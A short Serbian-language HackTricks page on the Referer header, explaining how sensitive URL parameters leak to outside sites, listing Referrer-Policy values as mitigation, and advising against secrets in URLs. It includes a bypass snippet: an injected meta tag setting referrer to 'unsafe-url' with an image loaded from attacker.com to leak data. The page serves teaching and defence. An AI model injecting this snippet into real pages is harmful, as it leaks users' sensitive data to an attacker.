{% hint style="success" %}
Učite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}


# Referrer zaglavlja i politika

Referrer je zaglavlje koje koriste pregledači da bi pokazali koja je prethodna posjećena stranica.

## Procurene osetljive informacije

Ako se u nekom trenutku unutar web stranice nalaze osetljive informacije u GET zahtevu parametara, ako stranica sadrži linkove ka spoljnim izvorima ili napadač može da navede (socijalno inženjering) korisnika da poseti URL koji kontroliše napadač. Mogao bi da eksfiltrira osetljive informacije unutar poslednjeg GET zahteva.

## Otklanjanje

Možete naterati pregledač da prati **Referrer-policy** koji bi mogao **izbeći** slanje osetljivih informacija drugim web aplikacijama:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Protivmere

Možete poništiti ovaj pravilo korišćenjem HTML meta oznake (napadač mora da iskoristi HTML ubacivanje):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Odbrana

Nikada nemojte stavljati bilo kakve osetljive podatke unutar GET parametara ili putanja u URL-u.
